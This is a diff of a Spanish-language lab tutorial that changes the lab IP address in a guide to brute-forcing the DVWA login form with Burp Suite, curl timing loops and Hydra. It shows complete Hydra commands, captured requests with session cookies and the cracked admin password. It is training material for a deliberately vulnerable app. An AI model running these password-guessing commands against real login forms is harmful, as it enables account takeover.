@@ -49,16 +49,16 @@ Al enviar este formulario, el navegador genera una petición `POST` que puede ob
 
 ```bash
 POST /dvwa/login.php HTTP/1.1
-Host: 10.0.2.100
+Host: 192.168.100.4
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate, br
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 88
-Origin: http://10.0.2.100
+Origin: http://192.168.100.4
 Connection: close
-Referer: http://10.0.2.100/dvwa/login.php
+Referer: http://192.168.100.4/dvwa/login.php
 Cookie: security=low; PHPSESSID=722h1rtd5hid3mu60b3kotnvbg
 Upgrade-Insecure-Requests: 1
 
@@ -136,7 +136,7 @@ Navegador (Kali) <--> PROXY (Burp Suite) <--> Servidor web (DVWA en Ubuntu Serve
 
 **Burp Suite** y **OWASP ZAP** son dos ejemplos de proxys ampliamente usados en auditorías web y vienen preinstalados en Kali Linux.
 
-> **Recuerda:** En el escenario de laboratorio, el servidor DVWA corre en la máquina Ubuntu Server con IP `10.0.2.100`, y Burp Suite se ejecuta en Kali Linux. Todo el tráfico entre el navegador Firefox (Kali) y DVWA pasa a través del proxy de Burp Suite en `127.0.0.1:8080`.
+> **Recuerda:** En el escenario de laboratorio, el servidor DVWA corre en la máquina Ubuntu Server con IP `192.168.100.4`, y Burp Suite se ejecuta en Kali Linux. Todo el tráfico entre el navegador Firefox (Kali) y DVWA pasa a través del proxy de Burp Suite en `127.0.0.1:8080`.
 
 ---
 
@@ -249,7 +249,7 @@ Para evitar capturar tráfico irrelevante (actualizaciones del navegador, teleme
 2. En la sección **Include in scope**, pulsar **Add** e introducir la URL base de DVWA:
 
 ```
-http://10.0.2.100/dvwa
+http://192.168.100.4/dvwa
 ```
 
 3. En **Out-of-scope request handling**, seleccionar **Drop all out-of-scope requests**.
@@ -279,13 +279,13 @@ La petición capturada tiene la siguiente estructura:
 
 ```bash
 GET /dvwa/vulnerabilities/brute/?username=admin&password=abc123&Login=Login HTTP/1.1
-Host: 10.0.2.100
+Host: 192.168.100.4
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate, br
 Connection: keep-alive
-Referer: http://10.0.2.100/dvwa/vulnerabilities/brute/
+Referer: http://192.168.100.4/dvwa/vulnerabilities/brute/
 Cookie: security=low; PHPSESSID=408knot3dl1jrvpni3h57d2krv
 Upgrade-Insecure-Requests: 1
 Priority: u=0, i
@@ -424,7 +424,7 @@ En el nivel de seguridad `medium`, el programador introduce un retardo artificia
 El retardo puede verificarse desde la terminal de Kali con `curl` y el comando `time`:
 
 ```bash
-kali@kali:~$ time curl -s -b "security=medium; PHPSESSID=408knot3dl1jrvpni3h57d2krv" 'http://10.0.2.100/dvwa/vulnerabilities/brute/?username=admin&password=123411&Login=Login'
+kali@kali:~$ time curl -s -b "security=medium; PHPSESSID=408knot3dl1jrvpni3h57d2krv" 'http://192.168.100.4/dvwa/vulnerabilities/brute/?username=admin&password=123411&Login=Login'
 <!DOCTYPE html>
 ...
 real 0m2,057s
@@ -437,7 +437,7 @@ sys 0m0,009s
 Para comprobar si el retardo es fijo o aleatorio, se puede enviar una secuencia de peticiones:
 
 ```bash
-kali@kali:~$ for i in {1..10}; do time curl -s -b "security=medium; PHPSESSID=408knot3dl1jrvpni3h57d2krv" 'http://10.0.2.100/dvwa/vulnerabilities/brute/?username=admin&password=123411&Login=Login' -o /dev/null ; done
+kali@kali:~$ for i in {1..10}; do time curl -s -b "security=medium; PHPSESSID=408knot3dl1jrvpni3h57d2krv" 'http://192.168.100.4/dvwa/vulnerabilities/brute/?username=admin&password=123411&Login=Login' -o /dev/null ; done
 real 0m2,024s
 ...
 real 0m2,027s
@@ -546,7 +546,7 @@ Para lanzar el ataque contra el formulario de DVWA se necesita la siguiente info
 |------|-------|
 | Usuario objetivo | `admin` |
 | Wordlist | `2020-200_most_used_passwords.txt` |
-| URL del formulario | `http://10.0.2.100/dvwa/vulnerabilities/brute/` |
+| URL del formulario | `http://192.168.100.4/dvwa/vulnerabilities/brute/` |
 | Método del formulario | `GET` |
 | Campos del formulario | `username`, `password`, `Login` |
 | Cookie de sesión | `PHPSESSID=u50vbil75pgsn9qgrj7q929sp8; security=low` |
@@ -555,7 +555,7 @@ Para lanzar el ataque contra el formulario de DVWA se necesita la siguiente info
 **Comando para el nivel low:**
 
 ```bash
-hydra -l admin -P 2020-200_most_used_passwords.txt 'http-get-form://10.0.2.100/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=u50vbil75pgsn9qgrj7q929sp8; security=low:F=Username and/or password incorrect' -V -t 5 -I -e nsr
+hydra -l admin -P 2020-200_most_used_passwords.txt 'http-get-form://192.168.100.4/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=u50vbil75pgsn9qgrj7q929sp8; security=low:F=Username and/or password incorrect' -V -t 5 -I -e nsr
 ```
 
 Los parámetros más relevantes del comando:
@@ -576,13 +576,13 @@ Los parámetros más relevantes del comando:
 Hydra también acepta una sintaxis alternativa equivalente:
 
 ```bash
-hydra -l admin -P 2020-200_most_used_passwords.txt -I 10.0.2.100 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=u50vbil75pgsn9qgrj7q929sp8; security=low:F=Username and/or password incorrect" -V -t 5 -I -e nsr
+hydra -l admin -P 2020-200_most_used_passwords.txt -I 192.168.100.4 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=u50vbil75pgsn9qgrj7q929sp8; security=low:F=Username and/or password incorrect" -V -t 5 -I -e nsr
 ```
 
 **Resultado esperado:**
 
 ```bash
-[80][http-get-form] host: 10.0.2.100   login: admin   password: password
+[80][http-get-form] host: 192.168.100.4   login: admin   password: password
 1 of 1 target successfully completed, 1 valid password found
 ```
 
